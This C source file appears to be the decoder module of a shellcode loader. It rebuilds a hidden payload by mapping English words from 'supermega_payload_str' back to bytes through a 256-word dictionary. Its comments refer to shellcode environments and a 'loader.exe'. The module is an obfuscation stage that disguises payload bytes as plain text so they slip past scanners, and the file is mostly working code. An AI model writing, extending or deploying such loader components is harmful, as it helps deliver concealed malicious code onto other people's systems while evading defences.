/* MODULE: DECODER
 * TYPE: english
 * DESC: Decodes payload by mapping english words back to bytes.
 * DATA: Expects 'supermega_payload_str' and 'DICTIONARY' (from payload.h).
 */
#include "../header/definitions.h"
#include <string.h>

// Defined in payload.h
extern const char* DICTIONARY[];
extern char supermega_payload_str[];

void decode_payload(char *dest, int len) {
    // Basic parser: split by space, lookup word in dictionary
    // NOTE: This implementation requires C standard library functions (strtok, strcmp)
    // which might be risky for some shellcode environments, but okay for loader.exe
    
    char *token = strtok(supermega_payload_str, " ");
    int byte_idx = 0;
    
    while(token != NULL && byte_idx < len) {
        // Find index in dictionary (0-255)
        // Optimization: In a real loader, we wouldn't scan linearly. 
        // For 'english' demo, we scan.
        for(int i=0; i<256; i++) {
             // In real world, DICTIONARY[i] will be defined for all 256 bytes
             // We assume valid input.
             if (strcmp(token, DICTIONARY[i]) == 0) {
                 dest[byte_idx++] = (char)i;
                 break;
             }
        }
        token = strtok(NULL, " ");
    }
}
